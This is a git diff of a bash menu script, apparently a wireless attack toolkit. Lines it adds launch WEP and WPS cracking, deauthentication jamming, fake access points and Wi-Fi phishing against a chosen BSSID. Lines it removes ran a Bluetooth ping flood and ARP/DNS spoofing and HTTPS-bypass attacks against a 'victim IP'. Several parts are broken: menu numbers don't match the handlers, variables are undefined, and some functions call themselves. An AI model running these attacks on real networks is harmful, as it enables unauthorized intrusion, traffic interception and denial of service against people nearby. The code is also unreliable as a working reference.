@@ -7,7 +7,7 @@ function tools_check(){
 clear
 echo "Checking Missing Tools....!"
 
-packages=("golang" "php" "reaver" "wifite" "xrdp" "tightvncpasswd" "aircrack-ng" "mdk3" "wifipumpkin3" "rtlsdr-scanner" "gqrx-sdr" "bettercap" "wireshark" "ettercap-common" "ettercap-graphical" "ettercap-text-only" "airgeddon" "bully" "nmap" "apache2" "fluxion" "mdk4" "mitmproxy" "fern-wifi-cracker")
+packages=("golang" "php" "reaver" "wifite" "aircrack-ng" "mdk3" "mdk4" "wifipumpkin3" "rtlsdr-scanner" "bettercap" "bully" "nmap" "apache2" "mitmproxy" "gr-gsm")
 missing_packages=()
 
 for package in "${packages[@]}"
@@ -32,66 +32,6 @@ fi
 clear
 
 }
-
-
-function bluetooth_devices(){
-
-    hcitool scan
-    sleep 10
-
-}
-
-function bluetooth_doos() {
-    execute_l2ping() {
-        l2ping -i hci0 -s $packages_size -f $target_addr
-    }
-
-    clear
-    echo "Searching....!"
-    output=$(hcitool scan 2>&1)
-    lines=($output)
-    id=0
-    unset 'lines[0]'
-    array=()
-    echo "[ID]  [MAC Address]  [Device]"
-    for line in "${lines[@]}"; do
-        info=($line)
-        mac="${info[0]}"
-        array+=("$mac")
-        echo "[$id] $mac ${info[@]:1}"
-        ((id++))
-    done
-
-    echo -e ""
-    read -p 'Target ID~# ' target_id
-    if ! [[ "$target_id" =~ ^[0-9]+$ ]] || [ "$target_id" -ge "${#array[@]}" ]; then
-        echo '[!] ERROR: Invalid Target ID'
-        exit 1
-    fi
-    target_addr="${array[$target_id]}"
-
-    read -p 'Packages size~# ' packages_size
-    if ! [[ "$packages_size" =~ ^[0-9]+$ ]]; then
-        echo '[!] ERROR: Packages size must be an integer'
-        exit 1
-    fi
-
-    read -p 'Threads~# ' threads_count
-    if ! [[ "$threads_count" =~ ^[0-9]+$ ]]; then
-        echo '[!] ERROR: Threads count must be an integer'
-        exit 1
-    fi
-
-    # Execute l2ping command using a thread pool
-    for ((i = 0; i < threads_count; i++)); do
-        execute_l2ping &
-    done
-
-    # Wait for all background jobs to finish
-    wait
-}
-
-
 
 
 function hotsport_only() {
@@ -144,6 +84,40 @@ function hotsport_ssh() {
   nmcli con up $ssid_name ifname $interface_name
   echo -e "\n\033[0;32mHotspot Create Successfullt***\n\033[0m"
   sleep 2
+}
+
+function rpi0w() {
+
+  # Define the network configuration for usb0
+  config="
+  allow-hotplug usb0
+  iface usb0 inet static
+      address 192.168.7.2
+     netmask 255.255.255.0
+     network 192.168.7.0
+     broadcast 192.168.7.255
+     gateway 192.168.7.1
+  "
+
+  # Check if the configuration already exists
+  if grep -q "allow-hotplug usb0" /etc/network/interfaces; then
+      echo "Configuration for usb0 already exists."
+  else
+      # Append the configuration to the /etc/network/interfaces file
+      echo "$config" | sudo tee -a /etc/network/interfaces
+
+      echo "Configuration for usb0 has been added."
+  fi
+
+  sudo systemctl enable avahi-daemon
+  sudo systemctl start avahi-daemon
+
+  echo "sudo iw phy phy0 interface add mon0 type monitor" >> /bin/mon0
+  echo "sudo ip link set mon0 up" >> /bin/mon0
+  chmod +x /bin/mon0
+
+  apt update
+  apt install hcxtools -y
 }
 
 function wifi_network() {
@@ -301,6 +275,9 @@ function restore_ip_change() {
   sleep 1
 }
 
+
+#WIFI PWNED
+
 function start_monitor_mode() {
   clear
   # Show list of available WiFi interfaces with numbers
@@ -338,12 +315,65 @@ function stop_monitor_mode() {
 }
 
 function wifite(){
+  clear
   wifite
+  sleep 10
+}
+
+function wifitewep(){
+  clear
+  wifite --wep
+  sleep 10
+}
+
+function wifitewps(){
+  clear
+  wifite --wps
+  sleep 20
 }
 
 function wifiphisher() {
+  wifiphisher
+}
+
+function aponly() {
   clear
-  wifiphisher --force-hostapd
+  # Show list of available WiFi interfaces with numbers
+  echo -e "Available WiFi interfaces:"
+  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+  for i in "${!interfaces[@]}"; do
+    echo -e "$(($i+1))) ${interfaces[$i]}"
+  done
+
+  # Ask user to select interface by number
+  read -p "Enter number of interface to use: " interface_number
+  interface_name=${interfaces[$(($interface_number-1))]}
+
+  #ap name
+  read -p "AP Name#> " apname
+
+  airbase-ng -e "$apname" -c 10 $interface_name
+}
+
+function wepcrack() {
+  clear
+  # Show list of available WiFi interfaces with numbers
+  echo -e "Available WiFi interfaces:"
+  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+  for i in "${!interfaces[@]}"; do
+    echo -e "$(($i+1))) ${interfaces[$i]}"
+  done
+
+  # Ask user to select interface by number
+  read -p "Enter number of interface to use: " interface_number
+  interface_name=${interfaces[$(($interface_number-1))]}
+
+  #ap name
+  read -p "BSSID#> " bssid
+  read -p "Channel Number#> " channel
+
+  besside-ng $interface_name -c $channel -b $bssid
+  aircrack-ng wep.cap
 }
 
 function airodump(){
@@ -363,8 +393,40 @@ function airodump(){
   airodump-ng $interface_name
 }
 
+function wash(){
+  clear
+  # Show list of available WiFi interfaces with numbers
+  echo -e "Available WiFi interfaces:"
+  interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+  
+  if [ ${#interfaces[@]} -eq 0 ]; then
+    echo "No WiFi interfaces found."
+    return 1
+  fi
+  
+  for i in "${!interfaces[@]}"; do
+    echo -e "$(($i+1))) ${interfaces[$i]}"
+  done
 
-function try_to_hack_wifi() {
+  # Ask user to select interface by number
+  read -p "Enter number of interface to use: " interface_number
+  
+  # Validate user input
+  if ! [[ "$interface_number" =~ ^[0-9]+$ ]] || [ "$interface_number" -lt 1 ] || [ "$interface_number" -gt ${#interfaces[@]} ]; then
+    echo "Invalid selection. Please enter a valid number."
+    return 1
+  fi
+  
+  interface_name=${interfaces[$(($interface_number-1))]}
+
+  clear
+  # Run the wash command with the selected interface
+  sudo wash -i $interface_name
+}
+
+
+
+function reaver() {
   # Function to print available Wi-Fi networks
   print_networks() {
     rm -rf /tmp/airodump-ng-01.csv
@@ -428,51 +490,72 @@ function try_to_hack_wifi() {
 }
 
 function handshake_brute(){
-  echo -e "Password Wordlist File Path :"
+  echo -e "Password Wordlist#>"
   read wordlist
-  echo -e "Handshake File Path :"
+  echo -e "Handshake File#>"
   read handshake
   aircrack-ng $handshake -w $wordlist
 }
 
 function wifi_jamming() {
-  # Function to print available Wi-Fi networks
-  print_networks() {
-    rm -rf /tmp/airodump-ng-01.csv
-    clear
-    airodump-ng $interface_name --output-format csv -w /tmp/airodump-ng &
-    sleep 60
-    kill $!
-    clear
-    echo -e "Option |  BSSID |  Channel  | Network Name"
-    echo -e "------------------------------------------"
-    cat /tmp/airodump-ng-01.csv | awk -F "," '{if(length($14)>0){print NR-1")",$1,$4,$14} }' | tail -n+2 | sort -k4 -rn
-  }
+  clear
+  echo "1) AIR-Replay"
+  echo "2) MDK3"
+  echo "2) MDK4"
+  read -p "Enter your choice: " choice
+  
 
-  # Function to run airodump-ng
-  run_airodump() {
-    bssid=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $1}}')
-    ch=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $4}}')
-    essid=$(cat /tmp/airodump-ng-01.csv | awk -F "," -v line=$option '{if(NR==line+1){print $14}}')
-    # Run the aireplay command
-    # Prompt the user for an option
-    echo "Choose an option:"
-    echo "1) Aircrack"
-    echo "2) Mdk3"
-    read -p "Enter your choice: " choice
+  if [ "$choice" = "1" ]; then
+      # Show list of available WiFi interfaces with numbers
+      echo -e "Available WiFi interfaces:"
+      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+      for i in "${!interfaces[@]}"; do
+        echo -e "$(($i+1))) ${interfaces[$i]}"
+      done
 
-    if [ "$choice" = "1" ]; then
-        reaver_output=$(aireplay-ng -0 0 -a $bssid $interface_name)
-        # Add your Aircrack commands here
-    elif [ "$choice" = "2" ]; then
-        echo -e "Wifi Jamming Was Started......"
-        reaver_output=$(mdk3 wlan0mon d -c $ch)
-        # Add your Mdk3 commands here
-    else
-        echo "Invalid choice. Please enter a valid option."
-    fi
-  }
+      # Ask user to select interface by number
+      read -p "Enter number of interface to use: " interface_number
+      interface_name=${interfaces[$(($interface_number-1))]}
+      read -p "BSSID#> " bssid
+      
+      reaver_output=$(aireplay-ng -0 0 -a $bssid $interface_name)
+      
+  elif [ "$choice" = "2" ]; then
+      # Show list of available WiFi interfaces with numbers
+      echo -e "Available WiFi interfaces:"
+      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+      for i in "${!interfaces[@]}"; do
+        echo -e "$(($i+1))) ${interfaces[$i]}"
+      done
 
+      # Ask user to select interface by number
+      read -p "Enter number of interface to use: " interface_number
+      interface_name=${interfaces[$(($interface_number-1))]}
+      read -p "Channel Number#> " channel
+      echo -e "Wifi Jamming Was Started......"
+      mdk3 $interface_name d -c $ch
+     
+  elif [ "$choice" = "3" ]; then
+      # Show list of available WiFi interfaces with numbers
+      echo -e "Available WiFi interfaces:"
+      interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
+      for i in "${!interfaces[@]}"; do
+        echo -e "$(($i+1))) ${interfaces[$i]}"
+      done
+
+      # Ask user to select interface by number
+      read -p "Enter number of interface to use: " interface_number
+      interface_name=${interfaces[$(($interface_number-1))]}
+
+      echo -e "Wifi Jamming Was Started......"
+      mdk4 $interface_name d -c $ch
+     
+  else
+      echo "Invalid choice. Please enter a valid option."
+  fi
+}
+
+function wpspincrack(){
   # Show list of available WiFi interfaces with numbers
   echo -e "Available WiFi interfaces:"
   interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
@@ -484,225 +567,18 @@ function wifi_jamming() {
   read -p "Enter number of interface to use: " interface_number
   interface_name=${interfaces[$(($interface_number-1))]}
 
-  while true; do
-    print_networks
-    echo -e ""
-    read -p "Choose the number (0 to rescan, Q to quit): " option
-    
+  read -p "BSSID#> " bssid
+  read -p "WPS PIN#> " wpspin
 
-    case $option in
-      Q|q) exit ;;
-      0) continue ;;
-      *)
-        if [[ $option =~ ^[0-9]+$ ]]; then
-          run_airodump
-        else
-          echo -e "Invalid option, please try again."
-        fi
-        ;;
-    esac
-  done
-}
-
-function airgeddon_tool(){
-  airgeddon
-}
-
-function Fluxion_tool(){
-  fluxion
-}
-
-function ssh_on(){
-  service ssh start
-  service ssh restart
-  systemctl enable ssh
-}
-
-function rdp_on(){
-  service xrdp start
-  service xrdp restart
-  systemctl enable xrdp
+  reaver -i $interface_name -b BSSID -p $wpspin -vv
 }
 
 function wifipumpkin_tool(){
-  wifipumpkin3
+  wp3
 }
 
-function ssh_file(){
-  clear
-  read -p "File Path~#" file_path
-  read -p "Enter Device Username~# " username
-  read -p "Enter Device Hostname~# " hostname
-  read -p "File destination path" destination_file
-  scp $file_path $username@$hostname:$destination_file
-}
+function monitorclient(){
 
-function php_server(){
-  read -p "Enter Port Number~# " port
-  php -S localhost:$port
-}
-
-function apache2_server(){
-  service apache2 start
-  service apache2 restart
-  systemctl enable apache2
-}
-
-function listen_port(){
-  read -p "Type a port number~# " port
-  nc -nvlp $port
-}
-
-function sdr_server(){
-  # Get a list of all local IP addresses
-  ips=($(hostname -I))
-
-  # Display the list with numbers
-  echo "Interface IP Addresses:"
-  for i in "${!ips[@]}"; do
-    echo "$(($i + 1))) ${ips[$i]}"
-  done
-
-  # Prompt the user for input
-  echo -n "Choose your ip~# "
-  read choice
-
-  # Validate the user's input
-  if [[ $choice =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#ips[@]} ]]; then
-    selected_ip=${ips[$(($choice - 1))]}
-    rtl_tcp -a $selected_ip
-  else
-    echo "Invalid choice."
-  fi
-}
-
-function dns_spoof(){
-  # Get a list of all local IP addresses
-  ips=($(hostname -I))
-
-  # Display the list with numbers
-  echo "H IP Addresses:"
-  for i in "${!ips[@]}"; do
-    echo "$(($i + 1))) ${ips[$i]}"
-  done
-
-  # Prompt the user for input
-  read -p "Choose your ip~# " choice
-  read -p  "Victim IP Address~# " ip_addresses
-  read -p "Target Website Domain Name~#" target_site
-  if [[ $choice =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#ips[@]} ]]; then
-    selected_ip=${ips[$(($choice - 1))]}
-    rm -rf /home/dns.cap
-    echo "set arp.spoof.fullduplex true" >> /home/dns.cap
-    echo "set arp.spoof.targets $ip_addresses" >> /home/dns.cap
-    echo "set dns.spoof.address $selected_ip" >> /home/dns.cap
-    echo "set dns.spoof.all true" >> /home/dns.cap
-    echo "set dns.spoof.domains $target_site,*.$target_site" >> /home/dns.cap
-    echo "arp.spoof on" >> /home/dns.cap
-    echo "net.sniff on" >> /home/dns.cap
-    echo "dns.spoof on" >> /home/dns.cap
-    # Show list of available WiFi interfaces with numbers
-    echo -e "Available WiFi interfaces:"
-    interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
-    for i in "${!interfaces[@]}"; do
-      echo -e "$(($i+1))) ${interfaces[$i]}"
-    done
-
-    # Ask user to select interface by number
-    read -p "Enter number of interface to use: " interface_number
-    interface_name=${interfaces[$(($interface_number-1))]}
-
-    # Set IP address for selected interface
-    bettercap -iface $interface_name -caplet /home/dns.cap
-  else
-    echo "Invalid choice."
-  fi
-}
-
-function sniffing(){
-  # Get a list of all local IP addresses
-  ips=($(hostname -I))
-
-  # Display the list with numbers
-  echo "H IP Addresses:"
-  for i in "${!ips[@]}"; do
-    echo "$(($i + 1))) ${ips[$i]}"
-  done
-
-  # Prompt the user for input
-  read -p "Choose your ip~# " choice
-  read -p  "Victim IP Address~# " ip_addresses
-  read -p "Target Website Domain Name~#" target_site
-  if [[ $choice =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#ips[@]} ]]; then
-    selected_ip=${ips[$(($choice - 1))]}
-    rm -rf /home/sniffing.cap
-    echo "set arp.spoof.fullduplex true" >> /home/sniffing.cap
-    echo "set arp.spoof.targets $ip_addresses" >> /home/sniffing.cap
-    echo "set dns.spoof.address $selected_ip" >> /home/sniffing.cap
-    echo "arp.spoof on" >> /home/sniffing.cap
-    echo "net.sniff on" >> /home/sniffing.cap
-    # Show list of available WiFi interfaces with numbers
-    echo -e "Available WiFi interfaces:"
-    interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
-    for i in "${!interfaces[@]}"; do
-      echo -e "$(($i+1))) ${interfaces[$i]}"
-    done
-
-    # Ask user to select interface by number
-    read -p "Enter number of interface to use: " interface_number
-    interface_name=${interfaces[$(($interface_number-1))]}
-
-    # Set IP address for selected interface
-    bettercap -iface $interface_name -caplet /home/sniffing.cap
-  else
-    echo "Invalid choice."
-  fi
-}
-
-function bypass_https(){
-  # Get a list of all local IP addresses
-  ips=($(hostname -I))
-
-  # Display the list with numbers
-  echo "IP Addresses:"
-  for i in "${!ips[@]}"; do
-    echo "$(($i + 1))) ${ips[$i]}"
-  done
-
-  # Prompt the user for input
-  read -p "Choose your ip~# " choice
-  read -p  "Victim IP Address~# " ip_addresses
-  if [[ $choice =~ ^[0-9]+$ && $choice -ge 1 && $choice -le ${#ips[@]} ]]; then
-    selected_ip=${ips[$(($choice - 1))]}
-    rm -rf /home/bypasshttps.cap
-    echo "net.probe on" >> /home/bypasshttps.cap
-    echo "arp.spoof on" >> /home/bypasshttps.cap
-    echo "set arp.spoof.fullduplex true" >> /home/bypasshttps.cap
-    echo "set arp.spoof.targets $ip_addresses" >> /home/bypasshttps.cap
-    echo "set net.sniff.local true" >> /home/bypasshttps.cap
-    echo "set dns.spoof.all true" >> /home/bypasshttps.cap
-    echo "hstshijack/hstshijack" >> /home/bypasshttps.cap
-    # Show list of available WiFi interfaces with numbers
-    echo -e "Available WiFi interfaces:"
-    interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
-    for i in "${!interfaces[@]}"; do
-      echo -e "$(($i+1))) ${interfaces[$i]}"
-    done
-
-    # Ask user to select interface by number
-    read -p "Enter number of interface to use: " interface_number
-    interface_name=${interfaces[$(($interface_number-1))]}
-
-    # Set IP address for selected interface
-    bettercap -iface $interface_name -caplet /home/bypasshttps.cap
-  else
-    echo "Invalid choice."
-  fi
-}
-
-function host_discover(){
-  rm -rf /home/netdiscover.cap
-  echo "net.show" >> /home/netdiscover.cap
   # Show list of available WiFi interfaces with numbers
   echo -e "Available WiFi interfaces:"
   interfaces=($(ls /sys/class/net | grep -E '^(wlan|en|wlx)'))
@@ -714,15 +590,15 @@ function host_discover(){
   read -p "Enter number of interface to use: " interface_number
   interface_name=${interfaces[$(($interface_number-1))]}
 
-  # Set IP address for selected interface
-  bettercap -iface $interface_name -caplet /home/netdiscover.cap
+  read -p "BSSID#> " bssid
+  airodump-ng $interface_name -d $bssid
 }
 
 while true
 do
     # Display the menu options
     clear
-    echo -e "\n\e[0;32m    ██╗      █████╗ ███████╗██╗   ██╗\e[0;38;5;128m██████╗ ██╗ \e[0;37mv1.1"
+    echo -e "\n\e[0;32m    ██╗      █████╗ ███████╗██╗   ██╗\e[0;38;5;128m██████╗ ██╗ \e[0;37mv2.1"
     echo -e "\e[0;32m    ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝\e[0;38;5;128m██╔══██╗██║"
     echo -e "\e[0;32m    ██║     ███████║  ███╔╝  ╚████╔╝ \e[0;38;5;128m██████╔╝██║  \e[0;37mBy \e[0;31m#Nahid0x1"
     echo -e "\e[0;32m    ██║     ██╔══██║ ███╔╝    ╚██╔╝  \e[0;38;5;128m██╔═══╝ ██║"
@@ -734,50 +610,34 @@ do
     echo -e "\e[33m*Requirement*"
     echo -e "\e[33m0\e[32m) Create Hotspot & Enable SSH    \e[33m00\e[32m) Connect WiFi Network"
     echo -e "\e[33mc\e[32m) Create Hotspot Only            \e[33mcheck\e[32m) Check Tools"
+    echo -e "\e[33mrpi0w\e[32m) Raspberry Pi Zero W Configure"
     echo -e ""
     echo -e "\e[33m*Hardware*"
-    echo -e "\e[33m1\e[37m) Change Mac-Address            \e[31m| \e[33m3\e[37m) Change Private IP Address"
-    echo -e "\e[33m2\e[37m) Restore Original Mac-Address  \e[31m| \e[33m4\e[37m) Restore IP Address"
+    echo -e "\e[33m01\e[37m) Change Mac-Address            \e[31m| \e[33m03\e[37m) Change Private IP Address"
+    echo -e "\e[33m02\e[37m) Restore Original Mac-Address  \e[31m| \e[33m04\e[37m) Restore IP Address"
     echo -e ""
     echo -e "\e[33m*WIFI Hacking*"
-    echo -e "\e[33m5\e[37m) Start monitor mode            \e[31m| \e[33m13\e[37m) Airgeddon"
-    echo -e "\e[33m6\e[37m) Stop monitor mode             \e[31m| \e[33m14\e[37m) Fluxion"
-    echo -e "\e[33m7\e[37m) Wifite                        \e[31m| \e[33m15\e[37m) WiFi-Pumpkin3"
-    echo -e "\e[33m8\e[37m) WIFI-Phishing"
-    echo -e "\e[33m9\e[37m) Dump & Monitoring WiFis"
-    echo -e "\e[33m10\e[37m) WPS Crack"
-    echo -e "\e[33m11\e[37m) Bruteforce-Handshake"
-    echo -e "\e[33m12\e[37m) Wifi Jamming"
+    echo -e "\e[33m05\e[37m) START Monitor Mode           \e[31m| \e[33m17\e[37m) Monitor Wifi Clients"
+    echo -e "\e[33m06\e[37m) STOP Monitor Mode            \e[31m| \e[33m18\e[37m) WPS Pin Crack [Reaver]"
+    echo -e "\e[33m07\e[37m) Wifite                       \e[31m| \e[33m19\e[37m) Wifi-Pumpkin3"
+    echo -e "\e[33m08\e[37m) WEP Hunt Only [Wifite]       \e[31m| \e[33m20\e[37m) Wifi-Phisher"
+    echo -e "\e[33m09\e[37m) WPS Hunt Only [Wifite]"
+    echo -e "\e[33m10\e[37m) Fake AP Only"
+    echo -e "\e[33m11\e[37m) WEP Crack"
+    echo -e "\e[33m12\e[37m) Monitoring Signal [Airodump]"
+    echo -e "\e[33m13\e[37m) Dump Signal [WASH]"
+    echo -e "\e[33m14\e[37m) WPS Crack [Reaver]"
+    echo -e "\e[33m15\e[37m) Handshake Brute [Aircrack]"
+    echo -e "\e[33m16\e[37m) WIFI Deauth"
     echo -e ""
-    echo -e "\e[33m*Server*"
-    echo -e "\e[33m16\e[37m) Enable SSH Server             \e[31m| \e[33m21\e[37m) Listen Port"
-    echo -e "\e[33m17\e[37m) Enable RDP"
-    echo -e "\e[33m18\e[37m) Transfer file using ssh"
-    echo -e "\e[33m19\e[37m) Start localhost using php"
-    echo -e "\e[33m20\e[37m) Start Apache2 Server"
-    echo -e ""
-    echo -e "\e[33m*SDR*"
-    echo -e "\e[33m22\e[37m) IMSI Catcher (RTL-SDR)"
-    echo -e "\e[33m23\e[37m) Start RTL-SDR Server"
-    echo -e ""
-    echo -e "\e[33m*MITM Attack*"
-    echo -e "\e[33m24\e[37m) DNS Spoofing           \e[31m| \e[33m29\e[37m) Host Discover - MITM"
-    echo -e "\e[33m25\e[37m) Monitoring Request"
-    echo -e "\e[33m26\e[37m) Start HTTPS Server"
-    echo -e "\e[33m27\e[37m) Bettercap GUI"
-    echo -e "\e[33m28\e[37m) Bypass HTTPS"
-    echo -e ""
-    echo -e "\e[33m*Bluetooth Attack*"
-    echo -e "\e[33m30\e[37m) Discover Devices"
-    echo -e "\e[33m31\e[37m) Bluetooth Jamming"
     # Read the user's input
-    echo -e "\e[37m"
-    read -p "$USER@$HOSTNAME~# " option
+    read -p "[$USER@$HOSTNAME]~ ❯ " option
     case $option in
       0) hotsport_ssh;;
       00) wifi_network;;
       c) hotsport_only;;
       check) tools_check;;
+      rpi0w) rpi0w;;
       1) change_mac_address;;
       2) restore_mac_address;;
       3) ip_change;;
@@ -785,30 +645,19 @@ do
       5) start_monitor_mode;;
       6) stop_monitor_mode;;
       7) wifite;;
-      8) wifiphisher;;
-      9) airodump;;
-      10) try_to_hack_wifi;;
-      11) handshake_brute;;
-      12) wifi_jamming;;
-      13) airgeddon_tool;;
-      14) Fluxion_tool;;
-      15) wifipumpkin_tool;;
-      16) ssh_on;;
-      17) rdp_on;;
-      18) ssh_file;;
-      19) php_server;;
-      20) apache2_server;;
-      21) listen_port;;
-      22) imsi_catcher;;
-      23) sdr_server;;
-      24) dns_spoof;;
-      25) arp_poision;;
-      26) https_server;;
-      27) bettercap_gui;;
-      28) bypass_https;;
-      29) host_discover;;
-      30) bluetooth_devices;;
-      31) bluetooth_doos;;
+      8) wifitewep;;
+      9) wifitewps;;
+      10) aponly;;
+      11) wepcrack;;
+      12) airodump;;
+      13) wash;;
+      14) reaver;;
+      15) handshake_brute;;
+      16) wifi_jamming;;
+      17) monitorclient;;
+      18) wpspincrack;;
+      19) wifipumpkin_tool;;
+      20) wifiphisher;;
       *) echo -e "Invalid option!!";;
     esac
 done
